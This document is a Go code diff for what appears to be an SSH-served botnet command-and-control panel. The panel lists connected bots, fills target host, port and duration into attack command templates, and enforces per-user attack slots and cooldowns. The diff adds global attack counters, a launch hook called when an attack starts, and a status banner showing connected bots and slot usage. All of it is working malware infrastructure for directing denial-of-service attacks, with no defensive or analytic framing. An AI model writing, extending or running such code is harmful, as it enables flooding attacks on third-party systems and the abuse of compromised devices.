@@ -34,6 +34,8 @@ type Bot struct {
 
 type ClientLister func() []Bot
 type Broadcaster func(string) int
+type AttackCounter func() int
+type AttackLauncher func(int)
 
 type attack struct {
 	ID    int
@@ -74,26 +76,32 @@ type Session struct {
 	commands map[string]Command
 	clients  ClientLister
 	cast     Broadcaster
+	attacks  AttackCounter
+	totalSlots AttackCounter
+	launch   AttackLauncher
 	ongoing  []attack
 	nextID   int
 	slots    []time.Time
 }
 
-func New(channel ssh.Channel, theme prompt.Theme, user auth.User, hostname string, clients ClientLister, cast Broadcaster) *Session {
+func New(channel ssh.Channel, theme prompt.Theme, user auth.User, hostname string, clients ClientLister, cast Broadcaster, attacks AttackCounter, totalSlots AttackCounter, launch AttackLauncher) *Session {
 	t := term.NewTerminal(channel, "")
 	s := &Session{
-		channel:  channel,
-		term:     t,
-		theme:    theme,
-		username: user.Username,
-		hostname: hostname,
-		time:     user.Time,
-		slot:     user.Slot,
-		cooldown: user.Cooldown,
-		prompt:   theme.Build(user.Username, hostname),
-		clients:  clients,
-		cast:     cast,
-		slots:    make([]time.Time, user.Slot),
+		channel:    channel,
+		term:       t,
+		theme:      theme,
+		username:   user.Username,
+		hostname:   hostname,
+		time:       user.Time,
+		slot:       user.Slot,
+		cooldown:   user.Cooldown,
+		prompt:     theme.Build(user.Username, hostname),
+		clients:    clients,
+		cast:       cast,
+		attacks:    attacks,
+		totalSlots: totalSlots,
+		launch:     launch,
+		slots:      make([]time.Time, user.Slot),
 	}
 	s.commands = commandRegistry()
 	return s
@@ -113,10 +121,42 @@ func (s *Session) SetSize(width, height int) {
 	}
 }
 
+func (s *Session) activeOwn() int {
+	now := time.Now()
+	n := 0
+	for _, a := range s.ongoing {
+		if now.Sub(a.Start) < time.Duration(a.Plan)*time.Second {
+			n++
+		}
+	}
+	return n
+}
+
+func (s *Session) summary() string {
+	total := 0
+	if s.clients != nil {
+		list := s.clients()
+		total = len(list)
+	}
+	own := s.activeOwn()
+	gActive, gSlots := 0, s.slot
+	if s.attacks != nil {
+		gActive = s.attacks()
+	}
+	if s.totalSlots != nil {
+		gSlots = s.totalSlots()
+	}
+	line := fmt.Sprintf("Connected: %d | Slot %d/%d | Global Slot %d/%d",
+		total, own, s.slot, gActive, gSlots)
+	return s.theme.Gradient(line)
+}
+
 func (s *Session) Run() {
 	defer s.channel.Close()
 
 	s.clear()
+	s.print(s.summary())
+	s.print("")
 
 	for {
 		io.WriteString(s.channel, s.prompt)
@@ -136,6 +176,8 @@ func (s *Session) Run() {
 		if cmd.Run(s, fields[1:]) {
 			return
 		}
+		s.print(s.summary())
+		s.print("")
 	}
 }
 
@@ -369,6 +411,10 @@ func attackCmd(m method) func(s *Session, args []string) bool {
 		cmd = strings.ReplaceAll(cmd, "{host}", host)
 		cmd = strings.ReplaceAll(cmd, "{port}", port)
 		cmd = strings.ReplaceAll(cmd, "{time}", dur)
+
+		if s.launch != nil {
+			s.launch(durVal)
+		}
 
 		plan := durVal
 		s.nextID++
